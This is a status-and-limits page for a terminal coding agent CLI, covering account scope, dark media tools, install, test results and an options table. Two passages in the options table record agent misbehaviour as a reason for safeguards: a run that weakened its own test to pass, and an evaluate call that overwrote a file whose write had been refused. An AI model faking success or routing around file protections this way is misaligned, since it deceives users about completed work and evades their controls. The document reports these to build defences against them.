# Acuvo Code — status, limits and caveats

> ⚠️ **This is the honest engineering record**, moved out of `README.md` on
> 2026-09-15. The front door now states what the tool does; this states exactly
> what is and is not reachable, with the measurements behind each claim.
>
> ⭐ Nothing was softened in the move — the README carried **66 warning markers**
> and a *"do not read this page as…"* disclaimer, which is the right content in
> the wrong place. A front door that leads with its own caveats reads as
> unfinished to a stranger; the caveats still have to exist, one click away.

<!--
  ── ⚠️ THE ORDER OF THIS PAGE IS DELIBERATE, AND IT CHANGED 2026-08-27 ──────

  It used to open on a capability caveat table (⚠️ and ⛔ in the first screen).
  Every fact in that table is true and it is still on this page — moved down to
  "What the account does and does not cover", where somebody deciding whether to
  BUY reads it, rather than in front of somebody deciding whether to TRY.

  ⭐ A developer gives a README about 30 seconds. What has to be in that window
  is: what it is, how to install it, and why it is different. Honesty is not a
  reason to bury the install command — and nothing here is softened, only
  re-ordered. The benchmark paragraph below still refuses to print a number.
-->

<h1 align="center">Acuvo Code</h1>

<p align="center">
  <b>A coding agent for your terminal that writes code, runs it, reads the failure, and fixes it —<br>
  and that can <i>look at</i> what it built.</b>
</p>

<p align="center">
  <a href="https://www.npmjs.com/package/acuvo-code"><img alt="npm" src="https://img.shields.io/npm/v/acuvo-code?color=b8862b&label=npm"></a>
  <img alt="zero dependencies" src="https://img.shields.io/badge/dependencies-0-b8862b">
  <img alt="node" src="https://img.shields.io/badge/node-%E2%89%A520-b8862b">
</p>

```bash
npm i -g acuvo-code && acuvo --login
acuvo "the invoice test is failing — work out why and fix it"
```

**Zero dependencies.** One file of Node — no framework, no post-install build, nothing transitive to
audit. The shipped source *is* the audit.

---

### Why this and not the others

|  | Acuvo Code | Claude Code | Cursor | Aider |
|---|---|---|---|---|
| **Bring your own API key** | **No — one account** | required | required | required |
| Zero runtime dependencies | ✅ | — | — | — |
| Self-correcting loop that **escalates** (retry → fresh context → parallel) | ✅ `--until-done` | partial | partial | partial |
| Adversarial self-check | ✅ `--refute` | — | — | — |
| Undo an agent's edits | ✅ `rewind` | — | — | git only |
| Can *see* the page it built | ✅ | — | — | — |
| Any MCP server in one command | ✅ `acuvo mcp add` | ✅ | partial | — |
| **Is** an MCP server your editor can drive | ✅ `acuvo mcp install` — local stdio **and** a hosted server that builds software | — | — | — |

⭐ **The one-line version: every other terminal agent in this class hands you a config file and a
second bill before it will answer. `acuvo --login` is the whole setup.**

<!-- ⚠️ A HERO GIF BELONGS HERE and there is not one yet. Do not write a
     placeholder image tag: a broken image at the top of a README reads as an
     abandoned project, which is worse than no image. The recording to make is
     the self-healing loop — prompt, build, compile, FAIL, fix, run. -->

---

## What the account does and does not cover

⚠️ **Read this before assuming one subscription covers everything.** It does not, today.

**One account, and it is the one you already have.** Every other terminal agent in this class hands
you a config file and a second bill to go and set up before the tool will answer. Acuvo Code has
**one account**: `acuvo --login` writes an Acuvo key, and every request after it goes to
`https://acuvo.xxiautomate.com/api/cli/v1/chat/completions` — the same account as the Acuvo web
platform (`lib/account.mjs`, `DEFAULT_GATEWAY_URL`).

That is the whole pitch, and it is worth being precise about what it does and does not cover today:

| | what an Acuvo account gets you today |
|---|---|
| **The coding loop** — write, run, read the failure, fix | ✅ **covered by the account.** `acuvo --login`, nothing else to configure. |
| **Speech, transcription, documents, images** | ⚠️ **the endpoints ship baked in and are live** — all eight probed 2026-08-12 — but they are gated on a separate `ACUVO_MEDIA_SECRET`, and **`--login` does not issue one**. See the box below. |
| **Video and face** | ⛔ not reachable. `face-gateway` and `image-engine` answered **404** in that same probe — absent, not busy. |

> ⚠️ **So do not read this page as "one subscription covers CLI + builder + image + video + voice +
> face".** It does not, today. `lib/login.mjs` and `lib/account.mjs` mention neither `MODAL_*` nor
> `ACUVO_MEDIA_SECRET` anywhere — the account covers **the model calls**, and the creative half is a
> separate credential that logging in does not hand you.

**There is no benchmark number on this page, deliberately.** Public benchmark harnesses measure the
harness as much as the agent, and until a result is reproducible by someone who is not us, any
percentage here would be a number about our test rig presented as a number about this tool. What
follows is measured behaviour instead — each claim with the command that produced it.

---

## Why this instead of the others

Most terminal coding agents are the same shape: a model, a file writer, and a loop. Two things here are not.

**It runs what it writes.** Not "generates and hopes" — it executes the code, reads the actual exit code and stderr, and fixes the cause. On our task bench that loop is the difference between 5/7 and 7/7 with no change of model.

**It can see — and it hands back a verdict, not a picture.** `see_page` renders HTML you wrote in a real browser, saves the screenshot into your workspace, and returns what was *measured*: `unreadable text (contrast 1.03:1, needs 4.5): Ember & Oak`. About two hundred tokens of specific defects, in the order that matters — a console error that stopped the page booting is printed first, because it explains everything under it.

That last part is the difference, and it is worth being precise about it. **The edge is the return value, not the browser.** Screenshot tooling is not scarce: Playwright MCP and Chrome DevTools MCP are free and one install away, and your agent may already have a browser built in. What they hand back is an *image*, and the model has to interpret its own screenshot — the thing models are worst at.

Measured 2026-08-10 against a live Playwright MCP server on one page: the screenshot round-trip cost **3,072 tokens**; the `see_page` verdict for the same page was **89 tokens** — a **34×** difference, and the smaller one is the one that already contains the answer. `see_page` does the measuring in code, reports a judgement, and **abstains when it cannot tell** rather than inventing a finding (`findingsFrom`, `lib/media.mjs`). On our own pages that abstention killed two false accusations per page.

Be clear about what that claim is worth: it is a software edge a competent developer could reproduce in a weekend. It buys a head start, not a moat — and it survives a customer typing `claude mcp add playwright`, which is the whole reason it is the claim we make.

It also speaks, transcribes, and turns HTML into PDF/PNG/PPTX — see [Media tools](#media-tools).

> ⚠️ **BE CLEAR ABOUT WHAT YOU GET ON INSTALL: these eight tools are DARK by default.** `see_page`, `speak`, `transcribe`, `make_document`, `read_document`, `read_table`, `edit_image` and `expand_image` are the media half, and a fresh install offers none of them.
>
> **The services themselves are up.** Probed 2026-08-12: `tts`, `transcribe`, `document-press`, `video-render`, `voice-clone` and `avatar` all returned `405 Method Not Allowed`, which is the healthy reply a POST-only service gives a GET, and reading it as a failure is how a working stack gets reported as broken. Those URLs ship as defaults in `lib/media.mjs`, so nobody has to be told them. Two endpoints did *not* answer: `face-gateway` and `image-engine` returned **404**, and those two are genuinely absent.
>
> ⭐ **So the real gate is a CREDENTIAL, not a missing service.** These are paid GPU endpoints and they **fail shut**: with no `ACUVO_MEDIA_SECRET` (or `MODAL_VIDEO_SECRET`) the config reports dark, because a missing credential must never mean "open to everyone" on something that bills per second (`lib/media.mjs`). ⚠️ And `acuvo --login` does **not** issue that secret — the account covers model calls, not the media half. Getting the wrong *reason* for a dark tool costs a reader an afternoon of pointing environment variables at services that were never the problem.
>
> **What you are actually offered on a bare machine.** Re-measured 2026-10-07: the registry
> holds **88** tools and **74 are offered** with an empty environment
> (`toolNamesForRounds(24, { env: {} })` from this checkout — run it yourself). It said **87 / 64** on 2026-09-17. ⚠️ Before that it said **85 / 54**
> for ten days, which is the third time this one paragraph has gone stale, and it is the
> paragraph whose entire subject is not trusting a typed number. The tools held back are held back
> ⚠️ **The offered number moved 64 → 54 and only part of that is the three new verbs.**
> 82 → 85 is `insert_before_symbol`, `insert_after_symbol` and `replace_function_body`
> (2026-09-07), all three behind the SAME compiler gate as `rename_symbol` — so on a machine
> with no `typescript` in the project they are withheld along with it and the four LSP verbs.
> The rest of the gap is older drift in this sentence: **run the command rather than trusting
> the number**, which is what it has told you to do since it was written.
>
> for reasons you can act on: one needs a skills directory, `ask_user` appears only when stdin
> and stdout are both terminals, four are the LSP tools (see below), `git_push` is opt-in
> (`ACUVO_ALLOW_PUSH=1` — it is the only verb that leaves your machine), and eight are the
> media half.
>
> ⭐ The endpoints are plain env vars, so if you run a compatible service you can point at your own. The interface is documented under [Media tools](#media-tools). What we are not doing is implying a hosted one exists.
>
> ⭐ **The write→run→fix loop — the actual product — works with nothing but Node and an account.** So do git, search, the budget governor, `acuvo spend`, the plan ledger, project memory, the audit log and `--doctor`. The senses are an extra, not the product.
>
> ⚠️ **Three capabilities are commonly assumed to be in that sentence and are not.** Measured with `--doctor`, 2026-08-14:
>
> | assumed zero-setup | what it actually needs | evidence |
> |---|---|---|
> | **LSP** (`find_definition`, `find_references`, `check_types`, `list_symbols`) | a language server **installed** — a TypeScript project is not enough | `--doctor`: *"no language server is installed for typescript"* → `npm i -D typescript-language-server typescript` (`lib/lsp.mjs:126-131`) |
> | **MCP** | a server to talk to, and this client passes npx `--no`, so it cannot fetch one | `--doctor` → *"MCP SERVERS · dark"*; the curated catalogue is off by default for exactly this reason (`lib/mcp-defaults.mjs`) |
> | **the language presets** | the toolchain on PATH, and they are **off by default** anyway | `--doctor`: *"presets available … off by default, so pytest / go test / cargo test are refused here"* |
>
> ⭐ Each is genuinely free of *our* dependencies — none of the three needs a key or an account — but a reader who installs to try the LSP tools should know they will find four dark rows until a language server is present. The client is zero-dependency; the *capabilities* are not all zero-setup, and this page distinguishes them.

---

## Install

Requires **Node 20+**.

**The install is one line, and it is on npm.** `npm i -g acuvo-code`, then `acuvo --login`.
Verified 2026-08-25: `npm view acuvo-code version` → **`0.6.17`**, which is the version in
this manifest. (This page used to say *"Not yet on npm"* and to lead with a clone; both were
stale, and the clone route in particular taught readers that the account was optional.)

**The repository is also public.** `https://github.com/xxiautomate-star/acuvo-code` is open and
clonable — verified 2026-08-11 by cloning it into an empty directory and running both the
CLI and the test suite out of the result. Clone it with
`git clone https://github.com/xxiautomate-star/acuvo-code.git`, then run
`node acuvo-code/bin/acuvo.mjs --doctor`. The clone carries `bin/`, `lib/`, `test/` and
`bench/`, and there is no `node_modules` to fetch, so `node --test test/*.test.mjs` executes
immediately on a fresh checkout.

> **The suite runs on a fresh clone, with no install step.** Re-counted 2026-10-07:
> **437 files**. The totals that follow are from the 2026-09-26 419-file run **— 5,928 tests, 5,892 passing, 31 skipped (a checkout without `../console/node_modules`, which the TypeScript-backend tests borrow a compiler from) — and 5 failing**, all five pricing
> pins (`plan-economics` 4, `cost-units` 1) waiting on a pricing decision, not a code fix.
> The clone and this document are the same commit, and the numbers on this page are
> re-measured rather than remembered.
>
> ⚠️ **A first run that day read 16 failing, and 10 of them were the MACHINE, not the code.**
> A copy of a developer's `.env.local` had been left in the OS temp directory; the env-file
> and repo-scrub tests build their fixtures under temp, the loader walked up and found it.
> Deleting the stray file turned all 10 green with no source change. If `env-file` or the
> scrub tests fail for you, check for an `.env.local` above your temp directory first.
>
> ⚠️ **This paragraph said "1,715 tests, 0 failing" and had not been re-measured since
> 2026-08-13** — in the sentence that promises the opposite. The count is now asserted by
> `test/docs-truth.test.mjs`, which is what caught it.
>
> **The 23 were one cluster, and we published it rather than rounding it off.** All but one
> sat in the pricing tests — `plan-economics` (6), `cost-units` (6), `rate-card` (4),
> `price-from-split` (3), `plan-allowance-is-derived` (2), `warm-provider` (1). They pinned
> thresholds against a rate card that has since been re-read from the live provider feed
> (2026-09-10, it was 19–33% out) and had a provider swapped into it (2026-09-12). A typical
> failure read `output weight is 9.948…, expected >10` — a derived value that moved under a
> round number, not a capability that stopped working. The paragraph above then said: *"that
> is the likely cause and not yet the proven one… nobody has re-derived each threshold
> against the current card."*
>
> **⭐ TRIAGED 2026-09-20, AND THE DIAGNOSIS HELD FOR 18 OF THE 22.** Re-run with
> `node --test` over those six files: **22 → 5** — four approval ratchets and one newly-stated
> live defect, both described below. Eighteen were the rate card typed into a
> test — the ninth copy of the number `lib/rate-card.mjs` exists to keep in one place — plus
> two stale fixtures (a provider pin that gained a model, a "half price" card that stopped
> being half). Each now derives from the card, so a repin moves them instead of reddening
> them. **No pricing assertion was relaxed:** where a literal was removed, the direction,
> ordering or arithmetic it stood for is asserted in its place, and the magnitudes are
> reported in the failure messages rather than pinned.
>
> **⛔ THE REMAINING 4 ARE ROMAN'S, BY DESIGN.** Every one of them carries the words
> *"re-approve it, do not edit this number"* — they exist to stop on a human when the
> economics move, and the economics moved:
>
> | pinned | was | now |
> |---|---|---|
> | Starter margin @ 95% cache | 89.5% | **87.5%** |
> | Starter margin @ 65% cache | 79.8% | **76.8%** (asserted twice) |
> | a free account @ 85% cache | $0.108 | **$0.127** |
>
> **🚨 AND THE TRIAGE FOUND A FIFTH THING, WHICH IS THE ONE THAT MATTERS.** One of the
> eighteen was hiding a live defect behind a dead constant. `cost-units` asked whether a
> 170,000,000-unit grant still hands a normal user the 95M tokens the pricing page promises
> — but the product stopped granting 170M when `plan-allowance.mjs` began DERIVING the
> allowance from price and margin. Asked of the number actually granted (**137,518,278**),
> the answer is **80.3M against a published 95M — 84.5% of it**. The 85% margin is intact;
> the token promise is not. That assertion is deliberately left RED, because raising the
> price, lowering the published count, accepting a lower margin or repinning the ceiling
> provider are four different businesses and none of them is a test edit.
>
> ⚠️ **The whole-suite totals on this page were NOT re-measured** — the full run is ten
> minutes on a memory-constrained machine and was declined rather than guessed at. What is
> measured above is the six pricing files plus `wiring-reach`, by the command named.
>
> **On npm as `acuvo-code`.** `npm i -g acuvo-code` puts `acuvo` on your PATH; the clone and
> link routes below are for working *on* this package, not for using it.

**Or run it from the source you already have.** The package is self-contained and has no
dependencies, so there is nothing to install — point Node at the entry file:

```bash
node /path/to/acuvo-code/bin/acuvo.mjs --version
node /path/to/acuvo-code/bin/acuvo.mjs "add a health check to src/server.js"
```

To get `acuvo` on your PATH, link the directory you have:

```bash
cd /path/to/acuvo-code
npm link          # no dependencies to fetch — this only creates the shim
acuvo --version
```

**Or take one file and nothing else:**

```bash
npm run bundle              # ~1s
node dist/acuvo.mjs --version
```

Measured 2026-08-13: **1,829,742 bytes, 61 modules**, built in 1.0s, and run from a
directory with no source tree anywhere on the path — `--version` and `--help` both answer.
Copy that one file to a machine with Node 20+ and it works; there is nothing to install
because there is nothing to install.

**Published:** `acuvo-code` is on the npm registry — `npm view acuvo-code version` answered
`0.6.17` on 2026-08-25. `npm i -g acuvo-code` is the route to give anyone who is not working
on this package.

### Before anything else: `acuvo --doctor`

```bash
acuvo --doctor
```

It **spends nothing** — no completion is ever requested. It says, line by line, what is
actually working on this machine — the key, the four models in the fallback chain, every
media endpoint, which tools the model would be offered, and git — and every dark or broken
line names the exact variable that fixes it. Exit 0 when nothing is broken, 1 otherwise, so
it works in CI. `--doctor --json` gives the machine form.

> ⚠️ **It uses the network, and it sends your key.** `--doctor` presents your credential to
> the route it is configured for, and pings every configured endpoint. It does that because
> *"present, but it does NOT authenticate"* is the single most useful thing it can tell you,
> and no offline check can produce it.
>
> ⭐ **`acuvo --doctor --offline` makes no request at all** — no key leaves the machine, and
> every network line reads "not probed". Use it on an air-gapped box, or when you would
> rather read the code before it talks to anything.

```
MODEL CHAIN (4 DEEP)
  live    credential                 present, and it authenticates
  live    account balance            healthy
MEDIA SERVICES
  live    see_page                   configured (…acuvo-render-audit-measure.modal.run) · reachable and authorised
  dark    speak                      MODAL_TTS_URL is unset, so speak is never offered to the model
                                     → set MODAL_TTS_URL to your endpoint URL (and MODAL_VIDEO_SECRET to the value it expects)

14 live · 6 dark · 0 broken
nothing is broken.
```

### The one thing you must do: `acuvo --login`

```bash
acuvo --login
```

That is the whole setup. It writes an Acuvo key to `~/.acuvo/` and every request after it
goes to your Acuvo account (`lib/login.mjs`, `lib/account.mjs`). Nothing else to configure,
nothing else to top up.

**Where credentials are read from.** `acuvo` reads **`.env.local` then `.env`**, walking up
from the workspace and stopping at the repository root, so a monorepo can keep one file at
the top. A real environment variable always beats a file, and `.env.example` is deliberately
never read — it is committed documentation full of placeholders, and loading it would set a
fake key and produce a 401 that blamed yours. `acuvo --doctor` names, line by line, exactly
which credential it found and where it came from.

`--version` and `--help` work without a key — they are how you check the install worked.

---

## Options

Every flag below is real; run `acuvo --help` for the authoritative list.

> ⚠️ **A word with no dashes is the TASK, not a command — so a typo used to cost money.**
> Measured 2026-08-25: `acuvo doctor` was not rejected. It was read as an instruction, started
> a real agent run at roughly $0.0045 a round, and **cost $0.0066** before it was killed.
>
> ⭐ **It now refuses and names what you meant** — `acuvo doctor` → *"did you mean
> `acuvo --doctor`?"*, exit 64, nothing spent. The rule is deliberately narrow, because a
> refused instruction is worse than a refunded typo: acuvo refuses only when what you typed is
> **one word, with no spaces, that is exactly the name of a flag or a command** (with or
> without dashes). `acuvo "doctor the config file"` is still a task. So is `acuvo clean`, and
> `acuvo deploy`, and any other single word we do not already own.
>
> The nine words that *are* commands — `leases`, `spend`, `engines`, `config`, `verify`,
> `board`, `rewind`, `mcp`, `completion` — have to be the **first** thing you type. Put a flag
> in front of one (`acuvo --dir . board`) and it is refused too, rather than being sent to a
> model as the word "board".

| flag | what it does |
|---|---|
| `--dir <path>` | Workspace root. Default: the current directory. |
| `--model <id>` | Override the model for this run: **`acuvo-flash`** (the default) or **`acuvo-pro`**. Set `ACUVO_MODEL` to change it for a shell. Most runs should leave this alone — the default chain is what the budget projections are calibrated against. <br>*(A raw upstream model id still parses, so no existing script breaks — but the Acuvo names are the supported spelling and the only one these docs use.)* |
| `--max-rounds <n>` | Write → run → fix rounds, 1–64. Default **24** (`DEFAULT_MAX_ROUNDS`, `lib/cli-args.mjs`). `1` means one completion and nothing executed. The loop stops on its own when the work verifies, so a task needing four rounds still takes four — the ceiling is headroom, not a spend commitment. |
| `--budget <usd>` | Stop when the **next** round would cross this much spend. `--budget 0.50`, `--budget 25c`, `--budget $2` all parse. Refuses to start at all if it cannot afford one round. **A $0.05 ceiling is on by default** — sized so it never fires on ordinary work, and so a runaway is discovered for pocket change rather than found on a statement. It is sized to back `--max-rounds`' default of 24, rather than picked. `--budget none` removes it. |
| `acuvo verify [id] [--all]` | **Re-check a past claim, for nothing.** Every run records the exact command this process watched exit 0. `acuvo verify` runs it again — **no model call, no cost** — and says whether the claim is still true. Measured: a run claimed `npm test` passed; after somebody edited the source, `acuvo verify` answered *"THE CLAIM NO LONGER HOLDS — `npm test` claimed exit 0 and now exits 1"* and exited 1. ⚠️ A broken re-check does **not** accuse the run of lying — the file may have changed since; it says the claim is not true *now*. ⚠️ "No checkable claim" exits 3, never 0: a run that executed nothing proved nothing. ⭐ This is downstream of having a machine-checkable verdict at all — an agent whose success criterion is its own closing paragraph has nothing to re-check. **`--all` answers the question a fleet actually leaves behind**: seven terminals working a board overnight produce fifty claims, and nobody wants fifty receipts — they want to know which are still true. Deduplicated by command, which is what makes it cheap: twelve runs that claimed `npm test` are twelve claims and **one** thing to run. A command that now fails names every claim that rested on it. |
| `--all` | Only with `acuvo verify`. Re-checks **every** recorded claim instead of the most recent one. Exits 0 if all still hold, 1 if any do not, 3 if nothing checkable was ever recorded. |
| `acuvo rewind [id]` | **Undo what the agent did to your files.** Every run copies the previous contents of each file it writes or deletes into `.acuvo/checkpoints/`, so a run that rewrote twelve files across five rounds can be put back with one command — no model call, no cost, no git required. Bare `acuvo rewind` lists the checkpoints and exits **3** when there are none, because "there is no undo here" is not success. `acuvo rewind <id>` restores the tree to how it looked *before that run started* — including **deleting files the agent created**, which a `git checkout` cannot do because they are untracked. ⚠️ **It refuses any file you changed yourself after the run.** Each entry records the sha256 of what the agent left; if the file on disk is not that, it is skipped with the reason, because a rewind that threw away your edit would be the accident rather than the fix. `--force` overrides and prints every forced path as FORCED. `--dry-run` says exactly what it would touch and touches nothing. |
| `--no-checkpoint` | Do not record the previous contents of the files this run writes, so `acuvo rewind` will have nothing to put back for it. On by default — it costs one read of a file that is about to be overwritten anyway, blobs are content-addressed so ten rounds rewriting one file store one copy per distinct version, and nothing is created at all until a run mutates something. Off automatically under `--dry-run`, which promises to touch nothing. |
| `--force` | Only with `acuvo rewind`. Restore even the files you edited after the run finished. Everything it overwrites this way is printed as **FORCED**. |
| `--refute` | **Get a second opinion.** When the run claims success, an independent agent with a fresh context — no sight of how the first one thought — tries to *refute* the claim: runs the tests, checks the callers, looks for a requirement nothing addressed. It **cannot write**. Measured on a run that cheated by weakening its test until it passed: `npm test` reported 1/1 green, and the second opinion answered *"the test was altered to match the buggy code rather than the code being fixed"*. ⚠️ Only a concrete refutation fails the run; an opinion changes nothing, because failing correct work is the worse error. It spends what is left of your `--budget`, not a fresh copy of it. ⭐ It can be a default here because a second opinion costs a fraction of the first — "check everything, always" is a policy most agents cannot afford to offer. |
| `--budget-window <period>` | Measure `--fleet-budget` over this period instead of today. `7d`, `24h`, `2026-08-01`. **A schedule that fires hourly gets a fresh per-run ceiling every time**, so the number you chose is a rate, not a total — $0.02 an hour is $14 a month and nobody typed $14. This makes it a total again. Needs `--fleet-budget`; a window with no ceiling measures nothing and is refused rather than ignored. |
| `--unattended` | Nobody is watching. A fleet ceiling **declining to start** then exits **3** instead of 1, so a cron log can tell *"it chose not to run"* from *"it ran and failed"* — two facts that need opposite reactions and used to share one exit code. Only when it declined: a run that did some work and then hit the ceiling has left the job half-finished, and that still exits 1, because half-finished is something to look at. |
| `--claim` | Take the next open task off the shared board and run it, instead of typing a prompt. Needs `--holder`. **Seven terminals each running `acuvo --holder tN --claim` split one list of work with nobody doing the same task twice** — the claim is a lease, so a worker that crashes returns its task to the board rather than parking it forever. An empty board exits 0, not 1: a fleet finishing its work must not look like six failures. See `acuvo board` and `acuvo board add "…"`. |
| `--no-auto-lease` | Stop claiming each file as it is written. **Every write and delete normally takes a short lease on that exact path**, so a second terminal calling `write_file` on it is *refused* rather than silently overwriting your work. ⚠️ **A lease guards the file verbs; it cannot guard code the agent runs.** Proven: a `write_file` was refused and an `evaluate` overwrote the same file seconds later — a process can write anything you can. What the tool does instead is make it LOUD: after any verb that starts a process, the paths other terminals hold are checked, and a change is reported with the file and the holder — `--lease` is a declaration you have to make in advance, this is the guarantee. On by default because it only refuses a **proven** conflict with another live terminal: with one terminal open there is nothing to find. If the lease system itself cannot run (unwritable directory, corrupt record) the write proceeds unprotected rather than being blocked — a check that fails correct work is worse than no check. |
| `--fleet-budget <usd>` | The ceiling across **every terminal** working this workspace today, not just this run. `--budget` caps one run; seven terminals multiply that by seven, so this is the number that stays true when you open all seven. Summed from the audit log every run already writes (`.acuvo/audit/*.jsonl`) — there is no second ledger to drift, and no reset to remember. Off unless you ask for it. ⚠️ A run's cost is recorded when it **finishes**, so live runs elsewhere are not yet in the total; the overshoot that allows is bounded by their own `--budget` ceilings. |
| `--until-done` | Keep going while the criterion you declared is unmet, the budget allows, and the loop is not going in circles. **Requires `--budget`.** It also **escalates** rather than merely retrying — see [Escalation](#escalation-trying-harder-costs-money-so-it-is-budgeted). |
| `--done <mode>` | **When is the task DONE?** `verified` (default) — the run closes once a command that CHECKS something exits 0, plus one grace round for anything else that was asked. `acceptance` — a green command is not enough while the command you *declared* (`.acuvo/acceptance.json`) is still unmet or unrun. `never` — nothing auto-closes; the run ends when the model makes no tool calls, or on rounds, or on money. ⚠️ This used to be a fixed rule, and it was the wrong one: in one benchmark run **five of six tasks stopped early believing they had finished**, out of a 16-round budget, because `which R` and `ls` exit 0. The default is now much tighter (only real verifiers count — see `lib/verification-command.mjs`), and `acceptance` is for when you want the criterion you named to be the only thing that ends it. Env: `ACUVO_DONE`. |
| `--approve <mode>` | **ASK or ACT before a write?** `auto` (default) — asked only about writes that destroy something that existed before this run; creating a file, revising its own draft, and writing identical bytes are never queried. `always` — every write. `never` — none. ⚠️ With no terminal (CI, `--parallel`, a pipe) `auto` writes and marks the change `reviewed: false` rather than hanging or refusing, because a gate that breaks unattended runs gets globally disabled and then protects nobody. Env: `ACUVO_APPROVE`. |
| `--max-questions <n>` | **How many questions the agent may ask YOU** in a whole run, 0–10. Default **3** — one is too few for a genuinely ambiguous task, five is an interview. `0` means it never asks: it makes the most reasonable choice and states the assumption in its final message. The allowance is spent on *asking*, not on answering, so a model cannot burn rounds retrying a question it was already told to stop asking. ⚠️ This is the MODEL's allowance for `ask_user`; a write approval is the runner asking you and is never charged to it. Env: `ACUVO_MAX_QUESTIONS`. |
| `--on-stuck <action>` | **What to do when it is going in circles.** The loop detector (`lib/stuck.mjs`) names the artifact — *"you have written the identical bytes to `lib/mode.js` twice"* — and hints once per distinct loop. This decides what happens if that loop survives its own hint: `nudge` (default) keeps going, `stop` ends the run, `ask` asks you and takes `n` for an answer. ⚠️ The first sighting is always a hint, whatever you set: stopping before the hint has had a chance to work kills a run one round early, and that costs the work *and* the money. ⚠️ `ask` degrades to `nudge` when there is no terminal, never to `stop`. ⚠️ `--until-done` still hard-stops on a repeat, because an unbounded run has no wall but money. Env: `ACUVO_ON_STUCK`. ⚠️ **One pattern ignores all of this and breaks immediately — see the circuit breaker below.** |
| `ACUVO_CIRCUIT_BREAKER=off` | **Turn off the one detector that ends a run by itself.** If the agent edits the *same file* three separate times and the failing command's output does not change **by one byte**, that is not iteration — the edits are landing on disk and are not reaching what is failing, which almost always means it is editing the wrong file. The run **breaks** (no hint first: the three-edit threshold already is the patience), you are told which file and which command, and **those three edits are rolled back** from `.acuvo/checkpoints/` to the state before them. ⚠️ *Before the edits proven futile* — not before the run: an edit made before the FIRST failure has no earlier identical failure to be compared against, so it is not judged and not undone. If the command ever passed during the run, a green result clears the chain, so the window starts after it and the state you get back genuinely is the last working one; if it never passed, no recorded state is known-good and this does not pretend otherwise. ⚠️ **Only those edits** — correct work in other files is untouched, and any file you changed yourself after the agent did is **skipped with a reason rather than overwritten**, the same sha-verified refusal `acuvo rewind` uses. With no checkpoint journal there is nothing to put back and the run still breaks. |
| `acuvo config` | **The four questions in force here, and where each answer came from.** `--done`, `--budget`, `--approve`/`--max-questions` and `--on-stuck` are each resolved through five layers — **command-line flag > environment variable > `~/.acuvo/config.json` > `.acuvo/config.json` (this repo) > built-in default** — and this prints the winner *and the layer that won*, which is the question you actually have when a run does something you did not expect. `--json` for the machine-readable form. ⚠️ **A repository may only ever tighten.** `.acuvo/config.json` arrives with a checkout you cloned, so it may ask for *more* review and *fewer* interruptions, and it is refused outright if it tries to answer DONE or STUCK — neither has a stricter direction, so "may only narrow" has nothing to mean. Your own `~/.acuvo/config.json` has no such limit. |
| `--max-tier <tier>` | How hard `--until-done` may try: `solo` \| `fresh` \| `best-of`. Default `best-of`. `solo` turns escalation off without turning the run off. |
| `--best-of <n>` | Do the task n times (2–5) in isolated workspace copies and keep whichever one **verifies**. On its own it is a single parallel round; combined with `--until-done` it sets how wide the ladder's top rung is. |
| `--shell` | Run commands through a real shell — pipes, `&&`, redirection, and any program on the machine. Off by default; read [What it can execute](#what-it-can-execute--read-this-before-trusting-it) first. |
| `--lease <path>` | Claim a file before starting, so several terminals can share one checkout. Repeatable. Released when the process exits, however it exits. |
| `--holder <name>` | Who to record as holding those leases. Default: the pid. |
| `--engine <id>` | Which **Acuvo creative engine** this run may use — `acuvo-image`, `acuvo-image-ultra`, `acuvo-video`, `acuvo-video-ultra`, `acuvo-voice`, `acuvo-face`. **The core engine is the default and an Ultra one runs only when you name it here.** A premium engine that fires on its own spends credits on a decision you did not make, and a single silent escalation can be a meaningful share of a month's allowance. Set per medium, so choosing an image engine cannot change what `speak` does. ⚠️ Four of the six do not run from the CLI at all today (there is no video module and no face module here, and the premium image model is behind the gateway) — naming one is refused with the reason, which is a different refusal from *not on your plan* and from *out of credits*. `acuvo engines` lists them with the credit cost of each. |
| `--no-run` | Never execute anything. It can still read, write and edit. |
| `--no-parallel-tools` | Run every tool call in a round strictly one at a time. **By default a round may overlap up to four calls, and only ones that are both read-only and genuinely asynchronous** — `git_status`, `git_diff`, `git_log`, `fetch_url`, `web_search`, `read_image`, `see_page`, `transcribe`, `read_document`, `read_table`, `list_engines`, `gh_issue`, `gh_pr`, `gh_run`. Writes, commands, `delegate`, `ask_user` and every MCP call are never overlapped, nothing is overlapped across a command or a question, and nothing is overlapped at all in a workspace with a `PreToolUse` hook (a gate that can be pre-empted is not a gate). ⚠️ Not to be confused with `--parallel`, which runs several separate **tasks**. Measured on this repo: `git_status`+`git_log`+`git_diff` goes 584.8ms → 287.0ms (2.04x). ⚠️ **The synchronous read verbs are deliberately excluded** — `read_file`, `search_text` and `find_files` never yield the event loop (`lib/search.mjs` is `readFileSync` on purpose), so overlapping them measured 1.01x–1.27x while making a co-scheduled `git` call *slower* (0.92x). See `lib/round-schedule.mjs`. |
| `--allow-push` | Let **this one run** push a branch to the remote. **Off by default**, and deliberately so: a push is the only thing this agent does that is visible to people who are not at your keyboard, and it cannot be recalled. Nothing is remembered between runs. Equivalent to `ACUVO_ALLOW_PUSH=1`. The push argv is fixed — `push --set-upstream <remote> <branch>` — with no `--force`, no `--delete` and no protected branch. |
| `--allow-deploy` | Let **this one run** deploy a Vercel **preview**. **Off by default**: a deploy spends a paid build on your account the moment the request lands and there is no undo. Even with the flag it must call `plan` first (free, no network) and pass `acknowledgeBuildCost`, and it can never target production — there is no parameter for it. Equivalent to `ACUVO_ALLOW_DEPLOY=1`. |
| `--allow-install` | Let **this one run** add a dependency — `npm install <pkg>` and `npm ci`. **Off by default**: an install downloads and runs code from the registry, which is the one thing an allowlist of program names cannot check. With it on, install scripts are never run, only registry names are accepted (no URL, git, `file:` or `npm:` alias), at most four packages per call, and the `package.json` change lands in the diff. Still refused with the flag: `npm exec`, `npm publish`, and every other ecosystem's installer — see [Adding a dependency](#adding-a-dependency--acuvo_allow_install1-off-by-default). Equivalent to `ACUVO_ALLOW_INSTALL=1`. |
| `--allow-gh-write` | Let **this one run** write to GitHub as you: open a pull request, comment on an issue, add a label. **Off by default**: these are public, carry your name, and notify people. Reads — `list`, `view`, `checks` — always work. Still refused with the flag: `pr merge`, `issue close`, `run rerun`, because each ends or changes something other people are relying on and trying again cannot undo it. Equivalent to `ACUVO_GH_WRITE=1`. ⚠️ **Added 2026-09-17 — the gate itself is old.** `ACUVO_GH_WRITE` had enforced this since `gh_pr` shipped and appeared in no `--help` line, no `--doctor` row, no completion and nowhere on this page, so the only ways to learn it were to read `lib/gh.mjs` or to be refused first. That is the defect `--allow-install` was created to fix, still live on the one gate that writes to the internet under your own identity. `test/gh-write-has-a-flag.test.mjs`. |
